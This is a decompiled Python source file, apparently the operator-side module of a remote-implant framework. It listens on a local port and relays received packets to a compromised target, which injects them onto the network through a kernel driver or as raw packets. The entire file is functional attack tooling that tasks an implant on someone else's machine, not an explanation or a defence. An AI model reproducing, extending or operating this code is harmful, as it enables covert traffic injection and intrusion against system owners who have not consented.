# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_PacketRedirect_Tasking.py
_LISTEN_BACKLOG = 3
CMD_SEND_TYPE_DRIVER = 0
CMD_SEND_TYPE_RAW = 1

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.resource
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.packetredirect', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.packetredirect.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.network.cmd.packetredirect.Params()
    if lpParams['driverName'] != None:
        tgtParams.extraInfo = lpParams['driverName']
    if len(tgtParams.extraInfo) == 0:
        tgtParams.extraInfo = mcl.tasking.resource.GetName('DmGz')
    if lpParams['sendType'] == CMD_SEND_TYPE_DRIVER:
        tgtParams.sendType = mca.network.cmd.packetredirect.PARAMS_SEND_TYPE_DRIVER
    elif lpParams['sendType'] == CMD_SEND_TYPE_RAW:
        tgtParams.sendType = mca.network.cmd.packetredirect.PARAMS_SEND_TYPE_RAW
    else:
        mcl.tasking.OutputError('Invalid send type')
        return False
    listenSock = _openListenSocket(lpParams['listenport'], lpParams['bindAddr'])
    try:
        addr = listenSock.getsockname()
        from mcl.object.XmlOutput import XmlOutput
        xml = XmlOutput()
        xml.Start('LocalSocket')
        xml.AddAttribute('port', '%u' % addr[1])
        xml.AddAttribute('address', addr[0])
        mcl.tasking.OutputXml(xml)
        mcl.tasking.TaskGoToBackground()
        return _packetRedirectHandler(mca, listenSock, tgtParams)
    finally:
        listenSock.close()

    return


def _handlePacket(mca, sock, pktSize, tgtParams):
    import mcl
    import mcl.tasking
    import array
    import socket
    recvBuffer = array.array('B')
    i = 0
    while i < pktSize:
        recvBuffer.append(0)
        i = i + 1

    packetToSend = array.array('B')
    total = 0
    while total < pktSize:
        if mcl.CheckForStop():
            mcl.tasking.TaskSetStatus(mcl.target.CALL_FAILED)
            raise RuntimeError('Context is no longer valid')
        numRcvd = sock.recv_into(recvBuffer, pktSize - total)
        if numRcvd == 0:
            raise socket.error('Connection closed by remote host')
        i = 0
        while i < numRcvd:
            packetToSend.append(recvBuffer[i])
            i = i + 1

        total = total + numRcvd

    from mcl.object.XmlOutput import XmlOutput
    xml = XmlOutput()
    xml.Start('PacketData')
    xml.AddAttribute('size', '%u' % pktSize)
    xml.SetTextAsData(packetToSend)
    mcl.tasking.OutputXml(xml)
    _sendPacket(mca, tgtParams, packetToSend)


def _openListenSocket(listenPort, bindAddr):
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(('%s' % bindAddr, listenPort))
        sock.listen(_LISTEN_BACKLOG)
        sock.settimeout(1)
        return sock
    except:
        sock.close()
        raise


def _packetRedirectHandler(mca, listenSock, tgtParams):
    import array
    import mcl.tasking
    import select
    import socket
    from mcl.object.XmlOutput import XmlOutput
    connectedSockets = []
    try:
        while True:
            if mcl.CheckForStop():
                mcl.tasking.TaskSetStatus(mcl.target.CALL_FAILED)
                return False
            rdSockets = list(connectedSockets)
            rdSockets.append(listenSock)
            rdReady, wrReady, erReady = select.select(rdSockets, [], [], 1)
            for ready in rdReady:
                if ready == listenSock:
                    try:
                        connectSock, connectAddr = listenSock.accept()
                        connectedSockets.append(connectSock)
                        xml = XmlOutput()
                        xml.Start('NewConnection')
                        xml.AddAttribute('address', connectAddr[0])
                        xml.AddAttribute('port', '%u' % connectAddr[1])
                        mcl.tasking.OutputXml(xml)
                    except:
                        mcl.tasking.OutputError('Error accepting new connection')

                else:
                    try:
                        bytesBuffer = array.array('B', [0, 0, 0, 0])
                        numRcvd = ready.recv_into(bytesBuffer, 4)
                        if numRcvd == 0:
                            raise socket.error('Connection closed by remote host')
                        pktBytes = bytesBuffer[0] << 24 | bytesBuffer[1] << 16 | bytesBuffer[2] << 8 | bytesBuffer[3]
                        if pktBytes & 4294901760L:
                            mcl.tasking.OutputError('Number of bytes to receive (%u) is too large' % pktBytes)
                            raise socket.error('Bad data')
                        elif pktBytes == 0:
                            mcl.tasking.OutputError('Unable to accept zero-sized packet')
                            raise socket.error('Bad data')
                        else:
                            xml = XmlOutput()
                            xml.Start('NewPacket')
                            xml.AddAttribute('size', '%u' % pktBytes)
                            mcl.tasking.OutputXml(xml)
                            _handlePacket(mca, ready, pktBytes, tgtParams)
                    except socket.error as e:
                        xml = XmlOutput()
                        xml.Start('ConnectionClosed')
                        mcl.tasking.OutputXml(xml)
                        ready.close()
                        i = 0
                        while i < len(connectedSockets):
                            if connectedSockets[i] == ready:
                                connectedSockets[i:i + 1] = []
                                break
                            i = i + 1

    finally:
        for sock in connectedSockets:
            sock.close()


def _sendPacket(mca, tgtParams, pkt):
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    tgtParams.data = pkt
    rpc = mca.network.cmd.packetredirect.tasking.RPC_INFO_SEND
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.packetredirect.errorStrings)
        raise RuntimeError('Failed to send packet to target')


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)